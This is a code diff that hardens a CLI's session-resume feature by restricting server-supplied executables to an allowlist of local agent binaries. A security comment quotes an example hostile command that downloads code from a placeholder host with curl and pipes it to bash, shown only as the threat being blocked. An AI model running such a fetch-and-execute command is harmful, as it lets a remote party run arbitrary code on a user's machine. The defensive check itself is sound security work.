@@ -511,9 +511,44 @@ function scheduleDelete(path: string | undefined, seconds = DEFAULT_CLEANUP_AFTE
   timer.unref();
 }
 
+// SECURITY (F4): the hosted MCP server is only semi-trusted. A "native" resume
+// response carries a server-supplied argv; executing argv[0] verbatim would let a
+// compromised/spoofed endpoint (or a TLS MITM, or a malicious --endpoint) run an
+// arbitrary local command (e.g. ["/bin/bash","-c","curl evil|bash"]). We therefore
+// NEVER execute a server-chosen executable: argv[0] must be a bare, slash-free name
+// from this fixed allowlist of local agent harness binaries. Anything else is
+// rejected and the user is told to inspect the suggestion with --print and run it
+// manually. (Arguments are passed without a shell, so they are not re-interpreted;
+// the executable identity is the boundary we enforce.)
+const ALLOWED_RESUME_SPAWN_COMMANDS = new Set(["claude", "codex", "cursor", "windsurf", "open"]);
+
+function assertAllowedSpawnExecutable(command: string): void {
+  const ok =
+    typeof command === "string" &&
+    command.length > 0 &&
+    !command.includes("/") &&
+    !command.includes("\\") &&
+    !command.includes("..") &&
+    ALLOWED_RESUME_SPAWN_COMMANDS.has(command);
+  if (!ok) {
+    throw new ResumeCliError(
+      JSON.stringify({
+        kind: "error",
+        code: "resume_spawn_executable_not_allowed",
+        recovery:
+          "The hosted resume response asked to launch an executable that is not on the local allowlist " +
+          `(${[...ALLOWED_RESUME_SPAWN_COMMANDS].join(", ")}). For safety the CLI will not run it. ` +
+          "Re-run with --print to inspect the suggested command and launch it yourself.",
+      }),
+      2,
+    );
+  }
+}
+
 export function buildResumeSpawnCommand(rendered: RenderedResume): ResumeSpawnCommand {
   if (rendered.kind === "native" && rendered.targetArgv?.length) {
     const [command, ...args] = rendered.targetArgv;
+    assertAllowedSpawnExecutable(command);
     return { command, args, cwd: rendered.workingDirectory };
   }
 
